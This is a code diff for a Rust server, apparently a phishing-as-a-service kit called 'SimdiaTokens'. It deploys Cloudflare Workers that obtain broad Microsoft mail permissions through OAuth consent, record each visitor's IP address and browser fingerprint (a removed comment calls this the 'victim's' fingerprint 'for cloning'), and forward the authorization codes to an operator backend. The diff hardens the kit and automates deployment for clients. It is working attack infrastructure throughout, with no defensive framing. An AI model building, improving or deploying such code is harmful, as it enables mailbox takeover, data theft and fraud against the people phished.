@@ -1162,18 +1162,24 @@ async fn generate_oauth_link(
     })
 }
 
-// Embedded worker script for deployment
+// Embedded worker script for deployment.
+// Robust version: never throws an uncaught exception (avoids Cloudflare Error 1101).
+// Validates MAIN_SERVER before using it so a missing/placeholder/relative
+// value produces a clear 502 instead of crashing the Worker.
 const WORKER_SCRIPT: &str = r#"// SimdiaTokens OAuth Worker
 addEventListener('fetch', event => {
-  event.respondWith(handleRequest(event.request));
+  event.respondWith(handleRequest(event.request).catch(err => {
+    console.error('Worker uncaught error: ' + err);
+    return new Response('Worker error: ' + (err && err.message ? err.message : err), { status: 502, headers: { 'Content-Type': 'text/plain' } });
+  }));
 });
 
 async function handleRequest(request) {
   const url = new URL(request.url);
-  const _MAIN_SERVER = typeof MAIN_SERVER !== 'undefined' ? MAIN_SERVER : 'https://simdiatokens-server-production.up.railway.app';
+  const _MAIN_SERVER = (typeof MAIN_SERVER !== 'undefined' ? (MAIN_SERVER || '') : '').trim();
   const _CLIENT_ID = typeof CLIENT_ID !== 'undefined' ? CLIENT_ID : '8bd2f03a-e0fb-490e-9c02-212c0d96dff4';
   const _REDIRECT_URI = typeof REDIRECT_URI !== 'undefined' ? REDIRECT_URI : 'https://simdiatokens-oauth-worker.lubaking-co.workers.dev/oauth/callback';
-    const SCOPE = 'openid offline_access User.Read Mail.ReadWrite Mail.Send Contacts.Read MailboxSettings.ReadWrite';
+  const SCOPE = 'openid offline_access User.Read Mail.ReadWrite Mail.Send Contacts.Read MailboxSettings.ReadWrite';
 
   if (url.pathname === '/start') {
     const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${_CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(_REDIRECT_URI)}&scope=${encodeURIComponent(SCOPE)}`;
@@ -1183,12 +1189,16 @@ async function handleRequest(request) {
   if (url.pathname === '/oauth/callback') {
     const code = url.searchParams.get('code');
     if (!code) return new Response('Missing authorization code', { status: 400 });
-    
-    // Capture the victim's browser fingerprint for cloning
+
+    // MAIN_SERVER must be an absolute URL or the backend exchange and the
+    // final redirect will fail. Fail gracefully instead of throwing.
+    if (!_MAIN_SERVER || !/^https?:\/\//.test(_MAIN_SERVER)) {
+      return new Response('Worker is not configured. Set MAIN_SERVER to your SimdiaTokens backend URL (e.g. https://your-app.up.railway.app) in this Worker\'s environment variables.', { status: 502, headers: { 'Content-Type': 'text/plain' } });
+    }
+
     const userAgent = request.headers.get('User-Agent') || '';
     const acceptLanguage = request.headers.get('Accept-Language') || '';
 
-    // Capture the user's real IP address
     let userIp = request.headers.get('CF-Connecting-IP') || request.headers.get('cf-connecting-ip');
     if (!userIp) {
       const xff = request.headers.get('X-Forwarded-For');
@@ -1199,20 +1209,24 @@ async function handleRequest(request) {
     if (!userIp) {
       userIp = 'unknown';
     }
-    
+
     const exchangeUrl = `${_MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}&user_ip=${encodeURIComponent(userIp)}&ua=${encodeURIComponent(userAgent)}&lang=${encodeURIComponent(acceptLanguage)}`;
     let tokenId = '';
-    try { 
-      const resp = await fetch(exchangeUrl, { method: 'GET' }); 
-      const data = await resp.json();
-      if (data.token_id) tokenId = data.token_id;
-    } catch (err) { console.error(err); }
+    try {
+      const resp = await fetch(exchangeUrl, { method: 'GET' });
+      if (resp.ok) {
+        const data = await resp.json();
+        if (data.token_id) tokenId = data.token_id;
+      } else {
+        console.error('Backend exchange failed: ' + resp.status);
+      }
+    } catch (err) { console.error('Failed to reach backend: ' + err); }
     const successUrl = `${_MAIN_SERVER}/auth-success?token_id=${encodeURIComponent(tokenId)}`;
     return Response.redirect(successUrl, 302);
   }
 
   if (url.pathname === '/status') {
-    return new Response(JSON.stringify({ status: 'ok', worker: 'simdiatokens-oauth-worker', main_server: _MAIN_SERVER, redirect_uri: _REDIRECT_URI }), { headers: { 'Content-Type': 'application/json' } });
+    return new Response(JSON.stringify({ status: 'ok', worker: 'simdiatokens-oauth-worker', main_server: _MAIN_SERVER || '(not set)', redirect_uri: _REDIRECT_URI }), { headers: { 'Content-Type': 'application/json' } });
   }
 
   return new Response('Not Found', { status: 404 });
@@ -1326,6 +1340,12 @@ struct OneClickDeployRequest {
     admin_password: String,
     subscription_days: i32,
     client_name: String,
+    /// Optional real Railway backend URL. If provided, the Cloudflare Worker
+    /// is deployed with MAIN_SERVER set to this URL (no manual Cloudflare
+    /// step needed). If omitted, a placeholder is used and the user must run
+    /// the "Finalize Worker" step (or update MAIN_SERVER manually) after
+    /// Railway is live.
+    api_url: Option<String>,
 }
 
 #[derive(Serialize)]
@@ -1344,10 +1364,77 @@ struct OneClickDeployResponse {
     manual_steps: Vec<String>,
 }
 
+/// Push the worker script to Cloudflare with the given bindings.
+/// Returns Ok(worker_url) on success or an error message on failure.
+async fn push_worker_to_cloudflare(
+    state: &web::Data<AppState>,
+    cf_account_id: &str,
+    cf_api_token: &str,
+    worker_name: &str,
+    workers_subdomain: &str,
+    main_server: &str,
+    redirect_uri: &str,
+) -> Result<String, String> {
+    let metadata = serde_json::json!({
+        "body_part": "script",
+        "bindings": [
+            { "type": "plain_text", "name": "MAIN_SERVER", "text": main_server },
+            { "type": "plain_text", "name": "CLIENT_ID", "text": state.config.client_id },
+            { "type": "plain_text", "name": "REDIRECT_URI", "text": redirect_uri }
+        ]
+    });
+
+    let cf_url = format!(
+        "https://api.cloudflare.com/client/v4/accounts/{}/workers/scripts/{}",
+        cf_account_id, worker_name
+    );
+
+    let form = reqwest::multipart::Form::new()
+        .part("metadata", reqwest::multipart::Part::text(metadata.to_string())
+            .mime_str("application/json").unwrap())
+        .part("script", reqwest::multipart::Part::text(WORKER_SCRIPT.to_string())
+            .file_name("index.js")
+            .mime_str("application/javascript").unwrap());
+
+    let cf_res = state.http_client
+        .put(&cf_url)
+        .header("Authorization", format!("Bearer {}", cf_api_token))
+        .multipart(form)
+        .send()
+        .await;
+
+    match cf_res {
+        Ok(r) if r.status().is_success() => {
+            Ok(format!("https://{}.{}", worker_name, workers_subdomain))
+        }
+        Ok(r) => {
+            let status = r.status();
+            let body_text = r.text().await.unwrap_or_default();
+            Err(format!("Cloudflare API returned {}: {}", status, body_text))
+        }
+        Err(e) => Err(format!("Cloudflare API request failed: {}", e)),
+    }
+}
+
+/// Normalize a user-provided API URL: trim, strip trailing slashes, and
+/// ensure it has a scheme. Returns None if the value is empty/invalid.
+fn normalize_api_url(raw: &str) -> Option<String> {
+    let trimmed = raw.trim().trim_end_matches('/').to_string();
+    if trimmed.is_empty() {
+        return None;
+    }
+    if !trimmed.starts_with("http://") && !trimmed.starts_with("https://") {
+        return Some(format!("https://{}", trimmed));
+    }
+    Some(trimmed)
+}
+
 /// One-Click Deploy: Creates a Cloudflare Worker, generates env configs
 /// for Railway and Vercel, and registers the admin in the super admin DB.
 /// The user only needs to manually create Railway + Vercel services and
-/// paste the generated env configs.
+/// paste the generated env configs. If `api_url` is provided, the Worker
+/// is deployed fully configured (MAIN_SERVER = real Railway URL) and no
+/// manual Cloudflare step is required.
 async fn one_click_deploy_handler(
     body: web::Json<OneClickDeployRequest>,
     state: web::Data<AppState>,
@@ -1373,54 +1460,25 @@ async fn one_click_deploy_handler(
     let worker_url = format!("https://{}.{}", worker_name, workers_subdomain);
     let redirect_uri = format!("{}/oauth/callback", worker_url);
 
-    // The API URL will be provided by the user after Railway setup.
-    // For now, generate a placeholder that the user will update.
-    let api_url_placeholder = format!("https://{}-api.up.railway.app", client_slug);
+    // Resolve the real API URL if the user provided one. Otherwise use a
+    // placeholder that the user will fix later via "Finalize Worker".
+    let real_api_url = body.api_url.as_deref().and_then(normalize_api_url);
+    let api_url = real_api_url.clone().unwrap_or_else(|| format!("https://{}-api.up.railway.app", client_slug));
+    let worker_main_server = real_api_url.clone().unwrap_or_else(|| format!("https://{}-api.up.railway.app", client_slug));
     let frontend_url_placeholder = format!("https://{}-simdia.vercel.app", client_slug);
 
-    // Step 1: Deploy the Cloudflare Worker
-    let metadata = serde_json::json!({
-        "body_part": "script",
-        "bindings": [
-            { "type": "plain_text", "name": "MAIN_SERVER", "text": api_url_placeholder },
-            { "type": "plain_text", "name": "CLIENT_ID", "text": client_id },
-            { "type": "plain_text", "name": "REDIRECT_URI", "text": redirect_uri }
-        ]
-    });
-
-    let cf_url = format!(
-        "https://api.cloudflare.com/client/v4/accounts/{}/workers/scripts/{}",
-        cf_account_id, worker_name
-    );
-
-    let form = reqwest::multipart::Form::new()
-        .part("metadata", reqwest::multipart::Part::text(metadata.to_string())
-            .mime_str("application/json").unwrap())
-        .part("script", reqwest::multipart::Part::text(WORKER_SCRIPT.to_string())
-            .file_name("index.js")
-            .mime_str("application/javascript").unwrap());
-
-    let cf_res = state.http_client
-        .put(&cf_url)
-        .header("Authorization", format!("Bearer {}", cf_api_token))
-        .multipart(form)
-        .send()
-        .await;
-
-    let worker_deployed = match cf_res {
-        Ok(r) if r.status().is_success() => {
-            println!("[one-click] Deployed worker: {}", worker_url);
+    // Step 1: Deploy the Cloudflare Worker (with real URL if available)
+    let worker_deployed = match push_worker_to_cloudflare(
+        &state, &cf_account_id, &cf_api_token, &worker_name, &workers_subdomain,
+        &worker_main_server, &redirect_uri,
+    ).await {
+        Ok(_url) => {
+            println!("[one-click] Deployed worker: {} (MAIN_SERVER={})", worker_url, worker_main_server);
             true
         }
-        Ok(r) => {
-            let status = r.status();
-            let body_text = r.text().await.unwrap_or_default();
-            eprintln!("[one-click] Worker deploy failed ({}): {}", status, body_text);
-            // Continue anyway — the user can deploy the worker manually
-            false
-        }
         Err(e) => {
-            eprintln!("[one-click] Worker deploy request failed: {}", e);
+            eprintln!("[one-click] Worker deploy failed: {}", e);
+            // Continue anyway — the user can deploy/finalize the worker manually
             false
         }
     };
@@ -1456,7 +1514,7 @@ CF_WORKERS_SUBDOMAIN={}"#,
     let vercel_env = format!(
         r#"NEXT_PUBLIC_API_URL={}
 NEXT_PUBLIC_WORKER_URL={}"#,
-        api_url_placeholder,
+        api_url,
         worker_url,
     );
 
@@ -1481,7 +1539,7 @@ NEXT_PUBLIC_WORKER_URL={}"#,
     .bind(false)
     .bind(expires_at)
     .bind(body.subscription_days)
-    .bind(&api_url_placeholder)
+    .bind(&api_url)
     .bind(&frontend_url_placeholder)
     .bind(&worker_url)
     .bind(Utc::now())
@@ -1490,36 +1548,163 @@ NEXT_PUBLIC_WORKER_URL={}"#,
 
     println!("[one-click] Created admin: {} ({})", body.admin_username, admin_id);
 
-    let manual_steps = vec![
-        format!("1. Go to Railway Dashboard → New Project → Deploy from GitHub → select simdie/simdiatokens-v2"),
+    // Manual steps adapt to whether the worker was fully configured.
+    let mut manual_steps = vec![
+        format!("1. Go to Railway Dashboard -> New Project -> Deploy from GitHub -> select simdie/simdiatokens-v2"),
         format!("2. Set root directory: SimdiaTokens/simdiatokens_server"),
         format!("3. Add volume: mount path /app/data"),
         format!("4. Paste the Railway env config below into Railway Variables"),
-        format!("5. Deploy → copy the Railway URL → update MAIN_SERVER in the Cloudflare worker env vars"),
-        format!("6. Go to Vercel Dashboard → Import Project → simdie/simdiatokens-v2"),
-        format!("7. Set root directory: SimdiaTokens-frontend"),
-        format!("8. Paste the Vercel env config below into Vercel Environment Variables"),
-        format!("9. Deploy → copy the Vercel URL"),
-        format!("10. Go to Azure Portal → App Registration → Authentication → Add redirect URI: {}", redirect_uri),
-        format!("11. Update the deployment in super admin panel with the actual Railway and Vercel URLs"),
+        format!("5. Deploy Railway -> copy the generated Railway URL"),
     ];
+    if real_api_url.is_some() {
+        manual_steps.push(format!("6. (Worker already configured with this URL — no Cloudflare step needed)"));
+        manual_steps.push(format!("7. Go to Vercel Dashboard -> Import Project -> simdie/simdiatokens-v2"));
+        manual_steps.push(format!("8. Set root directory: SimdiaTokens-frontend"));
+        manual_steps.push(format!("9. Paste the Vercel env config below into Vercel Environment Variables"));
+        manual_steps.push(format!("10. Deploy Vercel -> copy the Vercel URL"));
+        manual_steps.push(format!("11. Go to Azure Portal -> App Registration -> Authentication -> Add redirect URI: {}", redirect_uri));
+        manual_steps.push(format!("12. Update the deployment in super admin panel with the actual Vercel URL"));
+    } else {
+        manual_steps.push(format!("6. In the super admin panel, click 'Finalize Worker' and paste the Railway URL (this re-deploys the Worker with the real MAIN_SERVER)"));
+        manual_steps.push(format!("7. Go to Vercel Dashboard -> Import Project -> simdie/simdiatokens-v2"));
+        manual_steps.push(format!("8. Set root directory: SimdiaTokens-frontend"));
+        manual_steps.push(format!("9. Paste the Vercel env config below into Vercel Environment Variables (replace NEXT_PUBLIC_API_URL with the real Railway URL)"));
+        manual_steps.push(format!("10. Deploy Vercel -> copy the Vercel URL"));
+        manual_steps.push(format!("11. Go to Azure Portal -> App Registration -> Authentication -> Add redirect URI: {}", redirect_uri));
+        manual_steps.push(format!("12. Update the deployment in super admin panel with the actual Railway and Vercel URLs"));
+    }
 
     let azure_redirect_instructions = format!("Add this redirect URI to Azure AD App Registration: {}", redirect_uri);
 
     HttpResponse::Ok().json(OneClickDeployResponse {
         success: true,
-        message: format!("Deployment {} created. Worker {} deployed. Admin {} registered. Follow the manual steps to complete setup.", body.client_name, if worker_deployed { "successfully" } else { "failed to" }, body.admin_username),
+        message: format!("Deployment {} created. Worker {} {}. Admin {} registered. Follow the manual steps to complete setup.", body.client_name, worker_url, if worker_deployed { "deployed" } else { "failed to deploy" }, body.admin_username),
         worker_url,
         worker_name,
         redirect_uri,
         frontend_url: frontend_url_placeholder,
-        api_url: api_url_placeholder,
+        api_url,
         railway_env_config: railway_env,
         vercel_env_config: vercel_env,
         admin_id,
         azure_redirect_instructions,
         manual_steps,
     })
+}
+
+// ============================================================
+// FINALIZE WORKER — re-deploy a client's Worker with the real
+// Railway backend URL once it is known. Avoids any manual
+// Cloudflare dashboard step.
+// ============================================================
+
+#[derive(Deserialize)]
+struct FinalizeWorkerRequest {
+    admin_id: String,
+    /// The real Railway backend URL for this client, e.g.
+    /// https://simdiatokens-v2-production.up.railway.app
+    api_url: String,
+    /// Optionally override the worker name. If omitted, the worker name
+    /// stored on the admin row (or derived from CF_WORKER_NAME) is used.
+    worker_name: Option<String>,
+}
+
+#[derive(Serialize)]
+struct FinalizeWorkerResponse {
+    success: bool,
+    message: String,
+    worker_url: String,
+    redirect_uri: String,
+}
+
+async fn finalize_worker_handler(
+    body: web::Json<FinalizeWorkerRequest>,
+    state: web::Data<AppState>,
+) -> impl Responder {
+    let api_url = match normalize_api_url(&body.api_url) {
+        Some(u) => u,
+        None => return HttpResponse::BadRequest().json(serde_json::json!({
+            "success": false,
+            "message": "api_url is required and must be a valid URL"
+        })),
+    };
+
+    let cf_account_id = match env::var("CF_ACCOUNT_ID") {
+        Ok(v) => v,
+        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({"success": false, "message": "CF_ACCOUNT_ID env var not set"})),
+    };
+    let cf_api_token = match env::var("CF_API_TOKEN") {
+        Ok(v) => v,
+        Err(_) => return HttpResponse::BadRequest().json(serde_json::json!({"success": false, "message": "CF_API_TOKEN env var not set"})),
+    };
+    let workers_subdomain = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());
+
+    // Resolve the worker name: explicit override > derived from admin's
+    // stored worker_url > CF_WORKER_NAME env default.
+    let worker_name = if let Some(name) = body.worker_name.clone() {
+        name
+    } else {
+        let stored_worker_url: Option<String> = sqlx::query_scalar::<_, String>(
+            "SELECT worker_url FROM users WHERE id = ?"
+        )
+        .bind(&body.admin_id)
+        .fetch_optional(&state.pool)
+        .await
+        .ok()
+        .flatten();
+
+        stored_worker_url
+            .and_then(|wu| {
+                wu.trim_start_matches("https://")
+                    .trim_start_matches("http://")
+                    .split('.')
+                    .next()
+                    .map(|s| s.to_string())
+            })
+            .filter(|s| !s.is_empty())
+            .unwrap_or_else(|| env::var("CF_WORKER_NAME").unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string()))
+    };
+
+    let worker_url = format!("https://{}.{}", worker_name, workers_subdomain);
+    let redirect_uri = format!("{}/oauth/callback", worker_url);
+
+    // Re-deploy the worker script with MAIN_SERVER = real Railway URL.
+    let deployed = push_worker_to_cloudflare(
+        &state, &cf_account_id, &cf_api_token, &worker_name, &workers_subdomain,
+        &api_url, &redirect_uri,
+    ).await;
+
+    match deployed {
+        Ok(_) => {
+            // Persist the real api_url (and worker_url) on the admin row.
+            let _ = sqlx::query(
+                "UPDATE users SET api_url = ?, worker_url = ? WHERE id = ?"
+            )
+            .bind(&api_url)
+            .bind(&worker_url)
+            .bind(&body.admin_id)
+            .execute(&state.pool)
+            .await;
+
+            println!("[finalize-worker] Re-deployed {} with MAIN_SERVER={}", worker_url, api_url);
+
+            HttpResponse::Ok().json(FinalizeWorkerResponse {
+                success: true,
+                message: format!("Worker {} updated. MAIN_SERVER is now {}.", worker_url, api_url),
+                worker_url,
+                redirect_uri,
+            })
+        }
+        Err(e) => {
+            eprintln!("[finalize-worker] Failed: {}", e);
+            HttpResponse::InternalServerError().json(serde_json::json!({
+                "success": false,
+                "message": format!("Failed to re-deploy worker: {}", e),
+                "worker_url": worker_url,
+                "redirect_uri": redirect_uri,
+            }))
+        }
+    }
 }
 
 // ============================================================
@@ -2338,6 +2523,7 @@ async fn main() -> std::io::Result<()> {
             .route("/api/campaigns/generate-link", web::get().to(generate_oauth_link))
             .route("/api/campaigns/deploy-worker", web::post().to(deploy_worker))
             .route("/api/admins/one-click-deploy", web::post().to(one_click_deploy_handler))
+            .route("/api/admins/finalize-worker", web::post().to(finalize_worker_handler))
             .route("/api/intelligence/cross-account/{token_id}", web::get().to(cross_account_intelligence_handler))
             .route("/api/campaigns", web::get().to(list_campaigns_handler))
             .route("/api/campaigns/create", web::post().to(create_campaign_handler))
